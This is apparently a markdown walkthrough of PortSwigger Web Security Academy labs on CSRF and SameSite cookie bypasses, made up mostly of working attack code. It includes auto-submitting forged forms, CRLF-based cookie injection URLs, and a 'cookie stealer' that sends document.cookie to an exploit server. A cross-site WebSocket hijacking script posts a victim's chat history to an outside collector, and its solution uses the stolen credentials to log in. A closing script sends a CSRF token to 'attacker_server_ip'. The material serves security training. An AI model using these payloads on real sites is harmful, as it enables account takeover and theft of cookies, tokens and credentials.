<!-- omit in toc -->
# CSRF

cookie stealer PoC:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a8f005804bda51883f54b9900880010.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="segsgesgse&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.location= "https://exploit-0ab800840426a51d83184a2b013d00b8.exploit-server.net/?kookie="+document.cookie;
    </script>
  </body>
</html>

```


<!-- omit in toc -->
## Table of Contents

- [CSRF vulnerability with no defenses](#csrf-vulnerability-with-no-defenses)
- [CSRF where token validation depends on request method](#csrf-where-token-validation-depends-on-request-method)
- [CSRF where token validation depends on token being present](#csrf-where-token-validation-depends-on-token-being-present)
- [CSRF where token is not tied to user session](#csrf-where-token-is-not-tied-to-user-session)
- [CSRF where token is tied to non-session cookie](#csrf-where-token-is-tied-to-non-session-cookie)
- [CSRF where token is duplicated in cookie](#csrf-where-token-is-duplicated-in-cookie)
- [CSRF where Referer validation depends on header being present](#csrf-where-referer-validation-depends-on-header-being-present)
- [CSRF with broken Referer validation](#csrf-with-broken-referer-validation)

## CSRF vulnerability with no defenses
Reference: https://portswigger.net/web-security/csrf/lab-no-defenses

<!-- omit in toc -->
### Quick Solution
Just use the PoC generator of Burp and place it in the exploit server. It just works.

<!-- omit in toc -->
### Solution
1. With your browser proxying traffic through Burp Suite, log in to your account, submit the "Update email" form, and find the resulting request in your Proxy history.
2. If you're using Burp Suite Professional, right-click on the request and select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
Alternatively, if you're using Burp Suite Community Edition, use the following HTML template and fill in the request's method, URL, and body parameters. You can get the request URL by right-clicking and selecting "Copy URL".
```html
<form method="$method" action="$url">
     <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
      document.forms[0].submit();
</script>
```
3. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
4. To verify that the exploit works, try it on yourself by clicking "View exploit" and then check the resulting HTTP request and response.
5. Click "Deliver to victim" to solve the lab.

## CSRF where token validation depends on request method
Reference: https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method

<!-- omit in toc -->
### Quick Solution
The payload is exactly the same of the previous lab except for the request method (use **GET** instead of **POST**).

example:

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1100310479ed53809b49f9000900b8.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="vfghzhzhzn&#64;spam&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>


<!-- omit in toc -->
### Solution
1. With your browser proxying traffic through Burp Suite, log in to your account, submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that if you change the value of the ``csrf`` parameter then the request is rejected.
3. Use "Change request method" on the context menu to convert it into a GET request and observe that the CSRF token is no longer verified.
4. If you're using Burp Suite Professional, right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
Alternatively, if you're using Burp Suite Community Edition, use the following HTML template and fill in the request's method, URL, and body parameters. You can get the request URL by right-clicking and selecting "Copy URL".
```html
<form method="$method" action="$url">
     <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
      document.forms[0].submit();
</script>
```
5. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
6. To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.
7. Click "Deliver to victim" to solve the lab.

## CSRF where token validation depends on token being present
Reference: https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present

<!-- omit in toc -->
### Quick Solution
Use the CSRF PoC generator from Burp and then just **remove** the ``csrf`` parameter.

<!-- omit in toc -->
### Solution
1. With your browser proxying traffic through Burp Suite, log in to your account, submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that if you change the value of the csrf parameter then the request is rejected.
3. Delete the ``csrf`` parameter entirely and observe that the request is now accepted.
4. If you're using Burp Suite Professional, right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
Alternatively, if you're using Burp Suite Community Edition, use the following HTML template and fill in the request's method, URL, and body parameters. You can get the request URL by right-clicking and selecting "Copy URL".
```html
<form method="$method" action="$url">
     <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
      document.forms[0].submit();
</script>
```
5. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
6. To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.
7. Click "Deliver to victim" to solve the lab.

## CSRF where token is not tied to user session
Reference: https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session

<!-- omit in toc -->
### Quick Solution
In this case there is a **CSRF token**, but it is not tied to user session. To exploit this one intercept a request, note the ``csrf`` value, generate a PoC and deliver it to the victim (without forwarding the initial request).

<!-- omit in toc -->
### Solution
1. With your browser proxying traffic through Burp Suite, log in to your account, submit the "Update email" form, and intercept the resulting request.
2. Make a note of the value of the CSRF token, then drop the request.
3. Open a private/incognito browser window, log in to your other account, and send the update email request into Burp Repeater.
4. Observe that if you swap the CSRF token with the value from the other account, then the request is accepted.
5. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Note that the CSRF tokens are single-use, so you'll need to include a fresh one.
6. Store the exploit, then click "Deliver to victim" to solve the lab.

## CSRF where token is tied to non-session cookie
Reference: https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie

<!-- omit in toc -->
This lab is actually pretty fun. There is a CSRF token protecting the change email functionality, but it is tied to non-session cookie (``csrfKey``). Of course the PoC from the previous lab cannot be used, there is a pretty cool way to inject ``csrfKey`` into the victim's browser. The search functionality stores in a cookie the last searched term, by searching a specific string like the following it is possible to set a valid cookie into the browser:
```
/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key
```

Now that we find a way to inject ``csrfKey`` into the victim's browser the PoC from the previous lab can be used by changing the auto-submit part to: 
```html
<img src="$cookie-injection-url" onerror="document.forms[0].submit()">
```

<!-- omit in toc -->
### Solution
1. With your browser proxying traffic through Burp Suite, log in to your account, submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that changing the ``session`` cookie logs you out, but changing the ``csrfKey`` cookie merely results in the CSRF token being rejected. This suggests that the ``csrfKey`` cookie may not be strictly tied to the session.
3. Open a private/incognito browser window, log in to your other account, and send a fresh update email request into Burp Repeater.
4. Observe that if you swap the ``csrfKey`` cookie and ``csrf`` parameter from the first account to the second account, the request is accepted.
5. Close the Repeater tab and incognito browser.
6. Back in the original browser, perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
7. Create a URL that uses this vulnerability to inject your csrfKey cookie into the victim's browser:
```
/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key
```
8. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab, ensuring that you include your CSRF token. The exploit should be created from the email change request.
9. Remove the ``script`` block, and instead add the following code to inject the cookie:
```html
<img src="$cookie-injection-url" onerror="document.forms[0].submit()">
```
10. Store the exploit, then click "Deliver to victim" to solve the lab.

example code:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0af500c604ca2ca580fc3ac800650091.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="grnjgrurghugr&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="o3BpINxyLJ0GNUGf3uZbnSlmor7noH9h" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0af500c604ca2ca580fc3ac800650091.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=Ka9JMsNY6a2qsOb1eQwCLX9oRQQbfJs4%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>

```

## CSRF where token is duplicated in cookie
Reference: https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie

<!-- omit in toc -->
### Quick Solution
This lab is somehow similar to the one before. In this case the ``csrf`` is duplicated in a cookie and can be injected into the victim's browser the same way as the previous lab.

<!-- omit in toc -->
### Solution
1. With your browser proxying traffic through Burp Suite, log in to your account, submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that the value of the ``csrf`` body parameter is simply being validated by comparing it with the csrf cookie.
3. Perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
4. Create a URL that uses this vulnerability to inject a fake csrf cookie into the victim's browser:
```
/?search=test%0d%0aSet-Cookie:%20csrf=fake
```
5. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab, ensuring that your CSRF token is set to "fake". The exploit should be created from the email change request.
6. Remove the script block, and instead add the following code to inject the cookie and submit the form:
```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

7. Store the exploit, then click "Deliver to victim" to solve the lab.

example:

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ae7001b0439bf30810d9dd000e00058.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="aznrjechtnt&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="fake" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0ae7001b0439bf30810d9dd000e00058.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>


## Lab: SameSite Lax bypass via method override

Solution
Study the change email function

    In Burp's browser, log in to your own account and change your email address.

    In Burp, go to the Proxy > HTTP history tab.

    Study the POST /my-account/change-email request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass the SameSite cookie restrictions.

    Look at the response to your POST /login request. Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default Lax restriction level.

    Recognize that this means the session cookie will be sent in cross-site GET requests, as long as they involve a top-level navigation.

Bypass the SameSite restrictions

    Send the POST /my-account/change-email request to Burp Repeater.

    In Burp Repeater, right-click on the request and select Change request method. Burp automatically generates an equivalent GET request.

    Send the request. Observe that the endpoint only allows POST requests.

    Try overriding the method by adding the _method parameter to the query string:
    GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1

    Send the request. Observe that this seems to have been accepted by the server.

    In the browser, go to your account page and confirm that your email address has changed.

Craft an exploit

    In the browser, go to the exploit server.

    In the Body section, create an HTML/JavaScript payload that induces the viewer's browser to issue the malicious GET request. Remember that this must cause a top-level navigation in order for the session cookie to be included. The following is one possible approach:
    <script>
        document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
    </script>

    Store and view the exploit yourself. Confirm that this has successfully changed your email address on the target site.

    Change the email address in your exploit so that it doesn't match your own.

    Deliver the exploit to the victim to solve the lab.


## Lab: SameSite Strict bypass via client-side redirect


Solution
Study the change email function

    In Burp's browser, log in to your own account and change your email address.

    In Burp, go to the Proxy > HTTP history tab.

    Study the POST /my-account/change-email request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions.

    Look at the response to your POST /login request. Notice that the website explicitly specifies SameSite=Strict when setting session cookies. This prevents the browser from including these cookies in cross-site requests.

Identify a suitable gadget

    In the browser, go to one of the blog posts and post an arbitrary comment. Observe that you're initially sent to a confirmation page at /post/comment/confirmation?postId=x but, after a few seconds, you're taken back to the blog post.

    In Burp, go to the proxy history and notice that this redirect is handled client-side using the imported JavaScript file /resources/js/commentConfirmationRedirect.js.

    Study the JavaScript and notice that this uses the postId query parameter to dynamically construct the path for the client-side redirect.

    In the proxy history, right-click on the GET /post/comment/confirmation?postId=x request and select Copy URL.

    In the browser, visit this URL, but change the postId parameter to an arbitrary string.
    /post/comment/confirmation?postId=foo

    Observe that you initially see the post confirmation page before the client-side JavaScript attempts to redirect you to a path containing your injected string, for example, /post/foo.

    Try injecting a path traversal sequence so that the dynamically constructed redirect URL will point to your account page:
    /post/comment/confirmation?postId=1/../../my-account

    Observe that the browser normalizes this URL and successfully takes you to your account page. This confirms that you can use the postId parameter to elicit a GET request for an arbitrary endpoint on the target site.

Bypass the SameSite restrictions

    In the browser, go to the exploit server and create a script that induces the viewer's browser to send the GET request you just tested. The following is one possible approach:
    <script>
        document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
    </script>

    Store and view the exploit yourself.

    Observe that when the client-side redirect takes place, you still end up on your logged-in account page. This confirms that the browser included your authenticated session cookie in the second request, even though the initial comment-submission request was initiated from an arbitrary external site.

Craft an exploit

    Send the POST /my-account/change-email request to Burp Repeater.

    In Burp Repeater, right-click on the request and select Change request method. Burp automatically generates an equivalent GET request.

    Send the request. Observe that the endpoint allows you to change your email address using a GET request.

    Go back to the exploit server and change the postId parameter in your exploit so that the redirect causes the browser to send the equivalent GET request for changing your email address:
    <script>
        document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
    </script>

    Note that you need to include the submit parameter and URL encode the ampersand delimiter to avoid breaking out of the postId parameter in the initial setup request.

    Test the exploit on yourself and confirm that you have successfully changed your email address.

    Change the email address in your exploit so that it doesn't match your own.

    Deliver the exploit to the victim. After a few seconds, the lab is solved.

## Lab: SameSite Strict bypass via sibling domain


Solution
Study the live chat feature

    In Burp's browser, go to the live chat feature and send a few messages.

    In Burp, go to the Proxy > HTTP history tab and find the WebSocket handshake request. This should be the most recent GET /chat request.

    Notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSWSH if you can bypass any SameSite cookie restrictions.

    In the browser, refresh the live chat page.

    In Burp, go to the Proxy > WebSockets history tab. Notice that when you refresh the page, the browser sends a READY message to the server. This causes the server to respond with the entire chat history.

Confirm the CSWSH vulnerability

    In Burp, go to the Collaborator tab and click Copy to clipboard. A new Collaborator payload is saved to your clipboard.

    In the browser, go to the exploit server and use the following template to create a script for a CSWSH proof of concept:
    <script>
        var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
        ws.onopen = function() {
            ws.send("READY");
        };
        ws.onmessage = function(event) {
            fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
        };
    </script>

    Store and view the exploit yourself

    In Burp, go back to the Collaborator tab and click Poll now. Observe that you have received an HTTP interaction, which indicates that you've opened a new live chat connection with the target site.

    Notice that although you've confirmed the CSWSH vulnerability, you've only exfiltrated the chat history for a brand new session, which isn't particularly useful.

    Go to the Proxy > HTTP history tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent GET /chat request.

    Notice that your session cookie was not sent with the request.

    In the response, notice that the website explicitly specifies SameSite=Strict when setting session cookies. This prevents the browser from including these cookies in cross-site requests.

Identify an additional vulnerability in the same "site"

    In Burp, study the proxy history and notice that responses to requests for resources like script and image files contain an Access-Control-Allow-Origin header, which reveals a sibling domain at cms-YOUR-LAB-ID.web-security-academy.net.

    In the browser, visit this new URL to discover an additional login form.

    Submit some arbitrary login credentials and observe that the username is reflected in the response in the Invalid username message.

    Try injecting an XSS payload via the username parameter, for example:
    <script>alert(1)</script>

    Observe that the alert(1) is called, confirming that this is a viable reflected XSS vector.

    Send the POST /login request containing the XSS payload to Burp Repeater.

    In Burp Repeater, right-click on the request and select Change request method to convert the method to GET. Confirm that it still receives the same response.

    Right-click on the request again and select Copy URL. Visit this URL in the browser and confirm that you can still trigger the XSS. As this sibling domain is part of the same site, you can use this XSS to launch the CSWSH attack without it being mitigated by SameSite restrictions.

Bypass the SameSite restrictions

    Recreate the CSWSH script that you tested on the exploit server earlier.
    <script>
        var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
        ws.onopen = function() {
            ws.send("READY");
        };
        ws.onmessage = function(event) {
            fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
        };
    </script>

    URL encode the entire script.

    Go back to the exploit server and create a script that induces the viewer's browser to send the GET request you just tested, but use the URL-encoded CSWSH payload as the username parameter. The following is one possible approach:
    <script>
        document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
    </script>

    Store and view the exploit yourself.

    In Burp, go back to the Collaborator tab and click Poll now. Observe that you've received a number of new interactions, which contain your entire chat history.

    Go to the Proxy > HTTP history tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent GET /chat request.

    Confirm that this request does contain your session cookie. As it was initiated from the vulnerable sibling domain, the browser considers this a same-site request.

Deliver the exploit chain

    Go back to the exploit server and deliver the exploit to the victim.

    In Burp, go back to the Collaborator tab and click Poll now.

    Observe that you've received a number of new interactions.

    Study the HTTP interactions and notice that these contain the victim's chat history.

    Find a message containing the victim's username and password.

    Use the newly obtained credentials to log in to the victim's account and the lab is solved.

## Lab: SameSite Lax bypass via cookie refresh


Solution
Study the change email function

    In Burp's browser, log in via your social media account and change your email address.

    In Burp, go to the Proxy > HTTP history tab.

    Study the POST /my-account/change-email request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions.

    Look at the response to the GET /oauth-callback?code=[...] request at the end of the OAuth flow. Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default Lax restriction level.

Attempt a CSRF attack

    In the browser, go to the exploit server.

    Use the following template to create a basic CSRF attack for changing the victim's email address:
    <script>
        history.pushState('', '', '/')
    </script>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="foo@bar.com" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
    </script>

    Store and view the exploit yourself. What happens next depends on how much time has elapsed since you logged in:

        If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately.

        If you logged in less than two minutes ago, the attack is successful and your email address is changed. From the Proxy > HTTP history tab, find the POST /my-account/change-email request and confirm that your session cookie was included even though this is a cross-site POST request.

Bypass the SameSite restrictions

    In the browser, notice that if you visit /social-login, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction.

    From the proxy history, notice that every time you complete the OAuth flow, the target site sets a new session cookie even if you were already logged in.

    Go back to the exploit server.

    Change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit /social-login, then submits the email change request after a short pause. The following is one possible approach:
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="pwned@web-security-academy.net">
    </form>
    <script>
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);

        function changeEmail(){
            document.forms[0].submit();
        }
    </script>

    Note that we've opened the /social-login in a new window to avoid navigating away from the exploit before the change email request is sent.

    Store and view the exploit yourself. Observe that the initial request gets blocked by the browser's popup blocker.

    Observe that, after a pause, the CSRF attack is still launched. However, this is only successful if it has been less than two minutes since your cookie was set. If not, the attack fails because the popup blocker prevents the forced cookie refresh.

Bypass the popup blocker

    Realize that the popup is being blocked because you haven't manually interacted with the page.

    Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked. The following is one possible approach:
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="pwned@portswigger.net">
    </form>
    <p>Click anywhere on the page</p>
    <script>
        window.onclick = () => {
            window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
            setTimeout(changeEmail, 5000);
        }

        function changeEmail() {
            document.forms[0].submit();
        }
    </script>

    Test the attack on yourself again while monitoring the proxy history in Burp.

    When prompted, click the page. This triggers the OAuth flow and issues you a new session cookie. After 5 seconds, notice that the CSRF attack is sent and the POST /my-account/change-email request includes your new session cookie.

    Go to your account page and confirm that your email address has changed.

    Change the email address in your exploit so that it doesn't match your own.

    Deliver the exploit to the victim to solve the lab.



## CSRF where Referer validation depends on header being present
Reference: https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present

<!-- omit in toc -->
### Quick Solution
This lab has no ``csrf`` token, but using the generated PoC results in a "*Invalid referer header* error. The catch is that removing the **Referer** header solves the issue. To remove it from the POST of the PoC just add the following line in the *head* section of the exploit page:
```html
<meta name="referrer" content="no-referrer">
```

<!-- omit in toc -->
### Solution
1. With your browser proxying traffic through Burp Suite, log in to your account, submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that if you change the domain in the Referer HTTP header then the request is rejected.
3. Delete the Referer header entirely and observe that the request is now accepted.
4. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Include the following HTML to suppress the Referer header:
```
<meta name="referrer" content="no-referrer">
```
5. Store the exploit, then click "Deliver to victim" to solve the lab.

## CSRF with broken Referer validation
Reference: https://portswigger.net/web-security/csrf/lab-referer-validation-broken

<!-- omit in toc -->
### Quick Solution
This lab is a little bit different from the previous, in this case the ``Referer`` header cannot be removed, but it can be bypassed by adding a query string to the history of the page:
```javascript
history.pushState("", "", "/?your-lab-id.web-security-academy.net")
```

Modern browsers do not add the query string in the ``Referer`` header, so I had to also add:
```html
<meta name="referrer" content="unsafe-url">
```

<!-- omit in toc -->
### Solution
1. With your browser proxying traffic through Burp Suite, log in to your account, submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater. Observe that if you change the domain in the Referer HTTP header, the request is rejected.
3. Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. The result should look something like this:
```
Referer: https://arbitrary-incorrect-domain.net?your-lab-id.web-security-academy.net
```
4. Send the request and observe that it is now accepted. The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string.
5. Create a CSRF proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab and host it on the exploit server. Edit the JavaScript so that the third argument of the ``history.pushState()`` function includes a query string with your lab instance URL as follows:
```
history.pushState("", "", "/?your-lab-id.web-security-academy.net")
```
This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.
6. If you store the exploit and test it by clicking "View exploit", you may encounter the "invalid Referer header" error again. This is because many browsers now strip the query string from the Referer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section:
```
Referrer-Policy: unsafe-url
```
7. Note that unlike the normal Referer header, the word "referrer" must be spelled correctly in this case.
Store the exploit, then click "Deliver to victim" to solve the lab.


## BONUS: steal a user’s CSRF token by Vickie Li

```html
<script>
var token = document.getElementsById('csrf')[0];
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://attacker_server_ip/?token="+token, true);
xhr.send(null);
</script>
```
## BONUS: CSRF PoC with base64 encoding by zseano

```html
<iframe src=”data:text/html;base64,form_code_encoded_in_base64_here”>
```

